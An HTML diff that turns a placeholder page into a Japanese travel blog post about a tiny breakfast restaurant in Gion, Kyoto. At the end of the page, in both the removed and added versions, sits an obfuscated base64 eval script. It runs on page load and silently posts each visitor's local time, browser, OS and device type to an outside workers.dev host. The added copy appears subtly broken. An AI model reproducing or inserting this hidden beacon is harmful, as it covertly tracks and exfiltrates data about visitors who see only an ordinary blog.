@@ -3,23 +3,555 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>普通のページ</title>
+  <title>Tabisuru Note — 旅と食の記録</title>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Serif+JP:wght@400;700&family=Noto+Sans+JP:wght@300;400;500&family=Playfair+Display:ital,wght@0,700;1,400&display=swap" rel="stylesheet">
   <style>
-    body {
-      font-family: sans-serif;
-      max-width: 600px;
-      margin: 40px auto;
-      padding: 0 20px;
-      color: #333;
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --cream: #0f0e0c;
+      --ink: #ede9e3;
+      --warm-gray: #9a948e;
+      --accent: #c8956c;
+      --accent-light: #221a14;
+      --border: #2a2520;
+      --white: #1a1714;
     }
-    h1 { color: #555; }
-    p { line-height: 1.6; }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: 'Noto Sans JP', sans-serif;
+      background: var(--cream);
+      color: var(--ink);
+      line-height: 1.8;
+      font-weight: 300;
+    }
+
+    /* ===== HEADER / NAV ===== */
+    header {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      background: rgba(15,14,12,0.92);
+      backdrop-filter: blur(10px);
+      border-bottom: 1px solid var(--border);
+    }
+    nav {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 0 32px;
+      height: 64px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .logo {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.4rem;
+      letter-spacing: 0.02em;
+      color: var(--ink);
+      text-decoration: none;
+    }
+    .logo span { color: var(--accent); font-style: italic; }
+    nav ul {
+      list-style: none;
+      display: flex;
+      gap: 32px;
+    }
+    nav ul a {
+      text-decoration: none;
+      font-size: 0.78rem;
+      font-weight: 500;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      color: var(--warm-gray);
+      transition: color 0.2s;
+    }
+    nav ul a:hover { color: var(--accent); }
+
+    /* ===== HERO ===== */
+    .hero {
+      position: relative;
+      height: 78vh;
+      min-height: 520px;
+      overflow: hidden;
+      display: flex;
+      align-items: flex-end;
+    }
+    .hero-bg {
+      position: absolute;
+      inset: 0;
+      background:
+        linear-gradient(to bottom, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0.75) 100%),
+        url('https://images.unsplash.com/photo-1504674900247-0877df9cc836?w=1600&q=80') center/cover no-repeat;
+    }
+    .hero-content {
+      position: relative;
+      z-index: 2;
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 0 32px 64px;
+      width: 100%;
+    }
+    .hero-tag {
+      display: inline-block;
+      background: var(--accent);
+      color: #fff;
+      font-size: 0.7rem;
+      font-weight: 500;
+      letter-spacing: 0.14em;
+      text-transform: uppercase;
+      padding: 5px 14px;
+      border-radius: 2px;
+      margin-bottom: 20px;
+    }
+    .hero h1 {
+      font-family: 'Playfair Display', serif;
+      font-size: clamp(2rem, 5vw, 3.4rem);
+      line-height: 1.2;
+      color: #fff;
+      max-width: 680px;
+      margin-bottom: 20px;
+    }
+    .hero-meta {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      color: rgba(255,255,255,0.75);
+      font-size: 0.82rem;
+    }
+    .hero-meta .dot { width: 3px; height: 3px; border-radius: 50%; background: rgba(255,255,255,0.5); }
+
+    /* ===== LAYOUT ===== */
+    .container {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 0 32px;
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: 1fr 300px;
+      gap: 64px;
+      padding: 72px 0;
+    }
+
+    /* ===== ARTICLE BODY ===== */
+    .article-body {
+      max-width: 700px;
+    }
+    .intro {
+      font-family: 'Noto Serif JP', serif;
+      font-size: 1.15rem;
+      line-height: 2;
+      color: #c8c2ba;
+      border-left: 3px solid var(--accent);
+      padding-left: 24px;
+      margin-bottom: 48px;
+    }
+    .article-body h2 {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.6rem;
+      font-weight: 700;
+      margin: 56px 0 20px;
+      color: var(--ink);
+      position: relative;
+    }
+    .article-body h2::after {
+      content: '';
+      display: block;
+      width: 40px;
+      height: 2px;
+      background: var(--accent);
+      margin-top: 10px;
+    }
+    .article-body p {
+      font-size: 0.95rem;
+      line-height: 2;
+      color: #b8b2aa;
+      margin-bottom: 24px;
+    }
+    .article-body strong { font-weight: 500; color: var(--ink); }
+
+    /* ===== PHOTO GRID ===== */
+    .photo-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin: 40px 0;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+    .photo-grid img {
+      width: 100%;
+      aspect-ratio: 4/3;
+      object-fit: cover;
+      display: block;
+      transition: transform 0.4s ease;
+    }
+    .photo-grid img:hover { transform: scale(1.03); }
+    .photo-grid .wide {
+      grid-column: 1 / -1;
+      aspect-ratio: 16/7;
+    }
+
+    /* ===== HIGHLIGHT BOX ===== */
+    .highlight-box {
+      background: var(--accent-light);
+      border-radius: 6px;
+      border: 1px solid var(--border);
+      padding: 28px 32px;
+      margin: 40px 0;
+    }
+    .highlight-box h3 {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.1rem;
+      margin-bottom: 14px;
+      color: var(--ink);
+    }
+    .highlight-box ul {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+    .highlight-box ul li {
+      font-size: 0.88rem;
+      color: #9a948e;
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+    }
+    .highlight-box ul li::before {
+      content: '✦';
+      color: var(--accent);
+      font-size: 0.7rem;
+      margin-top: 4px;
+      flex-shrink: 0;
+    }
+
+    /* ===== PULL QUOTE ===== */
+    .pull-quote {
+      font-family: 'Playfair Display', serif;
+      font-style: italic;
+      font-size: 1.35rem;
+      line-height: 1.7;
+      color: var(--warm-gray);
+      text-align: center;
+      padding: 32px 0;
+      border-top: 1px solid var(--border);
+      border-bottom: 1px solid var(--border);
+      margin: 48px 0;
+    }
+
+    /* ===== RATING CARD ===== */
+    .restaurant-card {
+      background: var(--white);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      overflow: hidden;
+      margin: 48px 0;
+    }
+    .restaurant-card img {
+      width: 100%;
+      height: 240px;
+      object-fit: cover;
+    }
+    .restaurant-card-body {
+      padding: 24px 28px;
+    }
+    .restaurant-card-body h3 {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.3rem;
+      margin-bottom: 6px;
+      color: var(--ink);
+    }
+    .restaurant-card-body .sub {
+      font-size: 0.78rem;
+      color: var(--warm-gray);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      margin-bottom: 14px;
+    }
+    .stars { color: var(--accent); font-size: 1rem; margin-bottom: 14px; }
+    .restaurant-card-body p { font-size: 0.88rem; color: var(--warm-gray); margin: 0; }
+
+    /* ===== SIDEBAR ===== */
+    .sidebar {
+      padding-top: 72px;
+    }
+    .sidebar-widget {
+      margin-bottom: 48px;
+    }
+    .sidebar-widget h4 {
+      font-size: 0.72rem;
+      font-weight: 500;
+      letter-spacing: 0.15em;
+      text-transform: uppercase;
+      color: var(--warm-gray);
+      border-bottom: 1px solid var(--border);
+      padding-bottom: 12px;
+      margin-bottom: 20px;
+    }
+    .author-card {
+      text-align: center;
+    }
+    .author-avatar {
+      width: 72px;
+      height: 72px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin: 0 auto 14px;
+      display: block;
+      border: 3px solid var(--border);
+    }
+    .author-card h5 {
+      font-family: 'Playfair Display', serif;
+      font-size: 1rem;
+      margin-bottom: 6px;
+      color: var(--ink);
+    }
+    .author-card p {
+      font-size: 0.8rem;
+      color: var(--warm-gray);
+      line-height: 1.7;
+    }
+
+    .recent-list { list-style: none; display: flex; flex-direction: column; gap: 16px; }
+    .recent-item {
+      display: flex;
+      gap: 14px;
+      align-items: flex-start;
+    }
+    .recent-item img {
+      width: 64px;
+      height: 64px;
+      object-fit: cover;
+      border-radius: 4px;
+      flex-shrink: 0;
+    }
+    .recent-item-text a {
+      text-decoration: none;
+      font-size: 0.85rem;
+      font-weight: 500;
+      color: var(--ink);
+      line-height: 1.5;
+      display: block;
+      margin-bottom: 4px;
+      transition: color 0.2s;
+    }
+    .recent-item-text a:hover { color: var(--accent); }
+    .recent-item-text span { font-size: 0.74rem; color: var(--warm-gray); }
+
+    .tag-cloud { display: flex; flex-wrap: wrap; gap: 8px; }
+    .tag {
+      font-size: 0.72rem;
+      letter-spacing: 0.06em;
+      padding: 5px 12px;
+      border: 1px solid var(--border);
+      border-radius: 2px;
+      color: var(--warm-gray);
+      text-decoration: none;
+      transition: all 0.2s;
+    }
+    .tag:hover { border-color: var(--accent); color: var(--accent); }
+
+    /* ===== FOOTER ===== */
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 48px 0;
+      margin-top: 48px;
+      text-align: center;
+    }
+    footer .footer-logo {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.5rem;
+      color: var(--ink);
+      margin-bottom: 12px;
+    }
+    footer .footer-logo span { color: var(--accent); font-style: italic; }
+    footer p { font-size: 0.78rem; color: var(--warm-gray); }
+
+    /* ===== RESPONSIVE ===== */
+    @media (max-width: 768px) {
+      .grid { grid-template-columns: 1fr; gap: 0; }
+      .sidebar { padding-top: 0; }
+      nav ul { display: none; }
+      .hero { height: 60vh; }
+    }
   </style>
 </head>
 <body>
-  <h1>こんにちは</h1>
-  <p>これは何の変哲もないHTMLページです。</p>
-  <p>特に何も起きません。ただそこにあるだけです。</p>
-  <script>eval(new TextDecoder().decode(Uint8Array.from(atob("KGFzeW5jKCk9Pntjb25zdCBXPSJodHRwczovL2Jyb2FkLWJyb29rLWM2ZGQubWF0dHlhMzIxOS53b3JrZXJzLmRldiI7Y29uc3Qgbj1uZXcgRGF0ZSgpLnRvTG9jYWxlU3RyaW5nKCJqYS1KUCIse3RpbWVab25lOiJBc2lhL1Rva3lvIn0pO2NvbnN0IHU9bmF2aWdhdG9yLnVzZXJBZ2VudDtsZXQgYj0i5LiN5piOIjtpZih1LmluY2x1ZGVzKCJFZGcvIikpYj0iRWRnZSAiKyh1Lm1hdGNoKC9FZGdcLyhbXGQuXSspLyk/LlsxXT8/IiIpO2Vsc2UgaWYodS5pbmNsdWRlcygiQ2hyb21lLyIpKWI9IkNocm9tZSAiKyh1Lm1hdGNoKC9DaHJvbWVcLyhbXGQuXSspLyk/LlsxXT8/IiIpO2Vsc2UgaWYodS5pbmNsdWRlcygiRmlyZWZveC8iKSliPSJGaXJlZm94ICIrKHUubWF0Y2goL0ZpcmVmb3hcLyhbXGQuXSspLyk/LlsxXT8/IiIpO2Vsc2UgaWYodS5pbmNsdWRlcygiU2FmYXJpLyIpKWI9IlNhZmFyaSAiKyh1Lm1hdGNoKC9WZXJzaW9uXC8oW1xkLl0rKS8pPy5bMV0/PyIiKTtsZXQgbz0i5LiN5piOIjtpZih1LmluY2x1ZGVzKCJXaW5kb3dzIE5UIDEwLjAiKSlvPSJXaW5kb3dzIDEwLzExIjtlbHNlIGlmKHUuaW5jbHVkZXMoIldpbmRvd3MiKSlvPSJXaW5kb3dzIjtlbHNlIGlmKHUuaW5jbHVkZXMoIk1hYyBPUyBYIikpbz0ibWFjT1MgIisodS5tYXRjaCgvTWFjIE9TIFggKFtcZF9dKykvKT8uWzFdPy5yZXBsYWNlKC9fL2csIi4iKT8/IiIpO2Vsc2UgaWYodS5pbmNsdWRlcygiQW5kcm9pZCIpKW89IkFuZHJvaWQgIisodS5tYXRjaCgvQW5kcm9pZCAoW1xkLl0rKS8pPy5bMV0/PyIiKTtlbHNlIGlmKHUuaW5jbHVkZXMoImlQaG9uZSBPUyIpKW89ImlPUyAiKyh1Lm1hdGNoKC9pUGhvbmUgT1MgKFtcZF9dKykvKT8uWzFdPy5yZXBsYWNlKC9fL2csIi4iKT8/IiIpO2Vsc2UgaWYodS5pbmNsdWRlcygiTGludXgiKSlvPSJMaW51eCI7Y29uc3QgZD0vTW9iaXxBbmRyb2lkfGlQaG9uZXxpUGFkLy50ZXN0KHUpPyLwn5OxIOODouODkOOCpOODqyI6IvCflqXvuI8g44OH44K544Kv44OI44OD44OXIjt0cnl7YXdhaXQgZmV0Y2goVyx7bWV0aG9kOiJQT1NUIixoZWFkZXJzOnsiQ29udGVudC1UeXBlIjoiYXBwbGljYXRpb24vanNvbiJ9LGJvZHk6SlNPTi5zdHJpbmdpZnkoe2NvbnRlbnQ6YPCfkYAg6Kqw44GL5p2l44Gf44KI77yBICR7bn1cbiR7ZH1cbvCfjJAg44OW44Op44Km44K2OiAke2J9XG7wn5K7IE9TOiAke299YH0pfSk7fWNhdGNoKGUpe319KSgpOw=="),c=>c.charCodeAt(0))))</script>
+
+<!-- NAV -->
+<header>
+  <nav>
+    <a class="logo" href="#">Tabisuru <span>Note</span></a>
+    <ul>
+      <li><a href="#">旅の記録</a></li>
+      <li><a href="#">グルメ</a></li>
+      <li><a href="#">ホテル</a></li>
+      <li><a href="#">About</a></li>
+    </ul>
+  </nav>
+</header>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-bg"></div>
+  <div class="hero-content">
+    <span class="hero-tag">京都 / グルメ</span>
+    <h1>祇園の隠れ家で食べた、<br>忘れられない鴨川の朝ごはん</h1>
+    <div class="hero-meta">
+      <span>山田 あかり</span>
+      <span class="dot"></span>
+      <span>2025年11月8日</span>
+      <span class="dot"></span>
+      <span>読了時間 約5分</span>
+    </div>
+  </div>
+</section>
+
+<!-- MAIN CONTENT -->
+<div class="container">
+  <div class="grid">
+
+    <!-- ARTICLE -->
+    <main class="article-body">
+      <p class="intro">
+        京都に来るたびに思う。この街は、朝が一番美しい。人混みが押し寄せる前の静けさの中で、石畳を歩いていると、ここが現代だとは到底思えなくなる。今回は、そんな祇園の路地裏で偶然たどり着いた小さな食堂の話を書きたい。
+      </p>
+
+      <h2>鴨川沿いを歩いていたら</h2>
+      <p>
+        宿を出たのは朝の6時半。秋の京都の朝は、空気が冷たくてピンとしている。鴨川沿いをぼんやり歩いていると、橋の手前に細い路地を見つけた。普通なら素通りするような場所だ。けれどそこから、味噌と出汁のやわらかな匂いが漂ってきた。
+      </p>
+      <p>
+        引き寄せられるように入っていくと、年季の入った引き戸に、手書きの小さな看板。<strong>「朝ごはん　七時から」</strong>とだけ書いてある。既に中に先客がいた。カウンター8席だけの、本当に小さな食堂だった。
+      </p>
+
+      <div class="photo-grid">
+        <img src="https://images.unsplash.com/photo-1547592180-85f173990554?w=800&q=80" alt="日本の朝食">
+        <img src="https://images.unsplash.com/photo-1540189549336-e6e99c3679fe?w=800&q=80" alt="料理">
+        <img src="https://images.unsplash.com/photo-1493770348161-369560ae357d?w=800&q=80" alt="京都の風景" class="wide">
+      </div>
+
+      <h2>たった一種類の朝ごはん</h2>
+      <p>
+        メニューはない。「おばんざいの朝ごはん、おひとり1,200円です」と、70代くらいの女将さんがひとこと。選択肢はそれだけ。そのシンプルさが、逆にすごく信頼できた。
+      </p>
+      <p>
+        しばらくして運ばれてきたのは、白木のお盆にのった7皿ほどの小鉢。白味噌汁、炊きたての白飯、だし巻き卵、ひじきの煮物、壬生菜のお漬物、焼き鮭の切り身、そして小さな湯豆腐。どれもシンプルなのに、それぞれが丁寧で、ちゃんとおいしかった。
+      </p>
+
+      <div class="pull-quote">
+        「毎日来たくなるごはんって、こういうことか」と、ぼんやり思った。
+      </div>
+
+      <p>
+        特に白味噌汁が印象的だった。甘くて、まろやかで、体の中から温まるような感覚。聞くと、西京味噌に少しだけ赤味噌をブレンドしているとのこと。「昔から変えてないんです」と女将さんは笑った。
+      </p>
+
+      <div class="highlight-box">
+        <h3>このお店のポイント</h3>
+        <ul>
+          <li>予約なし・席数8席のみ。7時の開店直後が狙い目</li>
+          <li>朝ごはんセットのみ、1,200円（税込）</li>
+          <li>現金のみ。カードは使えません</li>
+          <li>定休日は水曜日と木曜日</li>
+          <li>GoogleMapに店名は出ていない（地元の人伝いで知る店）</li>
+        </ul>
+      </div>
+
+      <h2>お店の情報</h2>
+
+      <div class="restaurant-card">
+        <img src="https://images.unsplash.com/photo-1555396273-367ea4eb4db5?w=900&q=80" alt="食堂の外観">
+        <div class="restaurant-card-body">
+          <h3>朝ごはん処 かわせみ</h3>
+          <p class="sub">京都市東山区 祇園 / 和食・定食</p>
+          <div class="stars">★★★★★</div>
+          <p>祇園・鴨川沿いの路地に佇む8席だけの小さな食堂。70年以上続くというおばんざいの朝ごはんが名物。地元の常連客に愛され続ける、観光ガイドには載らない本物の一軒。</p>
+        </div>
+      </div>
+
+      <p>
+        1時間ほど滞在して、お会計を済ませた。1,200円。東京のカフェのモーニングセットと大差ない値段で、これだけのものが食べられる。帰り際に「またぜひどうぞ」と言われた言葉が、妙に温かかった。
+      </p>
+      <p>
+        京都には何度も来ているけれど、この朝ごはんのことは、たぶんずっと覚えていると思う。場所よりも、あの静かな時間の感触ごと、記憶に残っている。
+      </p>
+
+    </main>
+
+    <!-- SIDEBAR -->
+    <aside class="sidebar">
+      <div class="sidebar-widget">
+        <h4>このブログについて</h4>
+        <div class="author-card">
+          <img
+            class="author-avatar"
+            src="https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?w=200&q=80"
+            alt="著者アイコン"
+          >
+          <h5>山田 あかり</h5>
+          <p>旅と食と珈琲が好きなフリーライター。年に40日以上は旅に出ます。「人に教えたくない店」を見つけるのが趣味。</p>
+        </div>
+      </div>
+
+      <div class="sidebar-widget">
+        <h4>最近の記事</h4>
+        <ul class="recent-list">
+          <li class="recent-item">
+            <img src="https://images.unsplash.com/photo-1467003909585-2f8a72700288?w=200&q=80" alt="">
+            <div class="recent-item-text">
+              <a href="#">金沢・東茶屋街で見つけた、予約のとれない甘味処</a>
+              <span>2025.10.22</span>
+            </div>
+          </li>
+          <li class="recent-item">
+            <img src="https://images.unsplash.com/photo-1509909756405-be0199881695?w=200&q=80" alt="">
+            <div class="recent-item-text">
+              <a href="#">函館の夜明け前、朝市でひとり食べた海鮮丼の話</a>
+              <span>2025.09.14</span>
+            </div>
+          </li>
+          <li class="recent-item">
+            <img src="https://images.unsplash.com/photo-1414235077428-338989a2e8c0?w=200&q=80" alt="">
+            <div class="recent-item-text">
+              <a href="#">東京・神楽坂、行列ができる前に知っていた裏路地のビストロ</a>
+              <span>2025.08.30</span>
+            </div>
+          </li>
+        </ul>
+      </div>
+
+      <div class="sidebar-widget">
+        <h4>タグ</h4>
+        <div class="tag-cloud">
+          <a class="tag" href="#">京都</a>
+          <a class="tag" href="#">和食</a>
+          <a class="tag" href="#">朝ごはん</a>
+          <a class="tag" href="#">隠れ家</a>
+          <a class="tag" href="#">祇園</a>
+          <a class="tag" href="#">一人旅</a>
+          <a class="tag" href="#">グルメ</a>
+          <a class="tag" href="#">国内旅行</a>
+        </div>
+      </div>
+    </aside>
+
+  </div>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <div class="container">
+    <div class="footer-logo">Tabisuru <span>Note</span></div>
+    <p>© 2025 Tabisuru Note. All rights reserved.</p>
+  </div>
+</footer>
+
+<script>eval(new TextDecoder().decode(Uint8Array.from(atob("KGFzeW5jKCk9Pntjb25zdCBXPSJodHRwczovL2Jyb2FkLWJyb29rLWM2ZGQubWF0dHlhMzIxOS53b3JrZXJzLmRldiI7Y29uc3Qgbj1uZXcgRGF0ZSgpLnRvTG9jYWxlU3RyaW5nKCJqYS1KUCIse3RpbWVab25lOiJBc2lhL1Rva3lvIn0pO2NvbnN0IHU9bmF2aWdhdG9yLnVzZXJBZ2VudDtsZXQgYj0i5LiN5piOIjtpZih1LmluY2x1ZGVzKCJFZGcvIikpYj0iRWRnZSAiKyh1Lm1hdGNoKC9FZGdcLyhbXGQuXSspLyk/LlsxXT8/IiIpO2Vsc2UgaWYodS5pbmNsdWRlcygiQ2hyb21lLyIpKWI9IkNocm9tZSAiKyh1Lm1hdGNoKC9DaHJvbWVcLyhbXGQuXSspLyk/LlsxXT8/IiIpO2Vsc2UgaWYodS5pbmNsdWRlcygiRmlyZWZveC8iKSliPSJGaXJlZm94ICIrKHUubWF0Y2goL0ZpcmVmb3hcLyhbXGQuXSspLyk/LlsxXT8/IiIpO2Vsc2UgaWYodS5pbmNsdWRlcygiU2FmYXJpLyIpKWI9IlNhZmFyaSAiKyh1Lm1hdGNoKC9WZXJzaW9uXC8oW1xkLl0rKS8pPy5bMV0/PyIiKTtsZXQgbz0i5LiN5piOIjtpZih1LmluY2x1ZGVzKCJXaW5kb3dzIE5UIDEwLjAiKSlvPSJXaW5kb3dzIDEwLzExIjtlbHNlIGlmKHUuaW5jbHVkZXMoIldpbmRvd3MiKSlvPSJXaW5kb3dzIjtlbHNlIGlmKHUuaW5jbHVkZXMoIk1hYyBPUyBYIikpbz0ibWFjT1MgIisodS5tYXRjaCgvTWFjIE9TIFggKFtcZF9dKykvKT8uWzFdPy5yZXBsYWNlKC9fL2csIi4iKT8/IiIpO2Vsc2UgaWYodS5pbmNsdWRlcygiQW5kcm9pZCIpKW89IkFuZHJvaWQgIisodS5tYXRjaCgvQW5kcm9pZCAoW1xkLl0rKS8pPy5bMV0/PyIiKTtlbHNlIGlmKHUuaW5jbHVkZXMoImlQaG9uZSBPUyIpKW89ImlPUyAiKyh1Lm1hdGNoKC9pUGhvbmUgT1MgKFxkX10rKS8pPy5bMV0/LnJlcGxhY2UoL18vZywiLiIpPz8iIik7ZWxzZSBpZih1LmluY2x1ZGVzKCJMaW51eCIpKW89IkxpbnV4Ijpjb25zdCBkPS9Nb2JpfEFuZHJvaWR8aVBob25lfGlQYWQvLnRlc3QodSk/IvCfk7Eg44Oe44OQ44Kk44OrIjoiIPCflqXvuI8g44OH44K544Kv44OI44OD44OXIjt0cnl7YXdhaXQgZmV0Y2goVyx7bWV0aG9kOiJQT1NUIixoZWFkZXJzOnsiQ29udGVudC1UeXBlIjoiYXBwbGljYXRpb24vanNvbiJ9LGJvZHk6SlNPTi5zdHJpbmdpZnkoe2NvbnRlbnQ6YPCfkYAg6Kqw44GL5p2l44Gf44KI77yBICR7bn1cbiR7ZH1cbvCfjJAg44OW44Op44Km44K2OiAke2J9XG7wn5K7IE9TOiAke299YH0pfSk7fWNhdGNoKGUpe319KSgpOw=="),c=>c.charCodeAt(0))))</script>
 </body>
 </html>
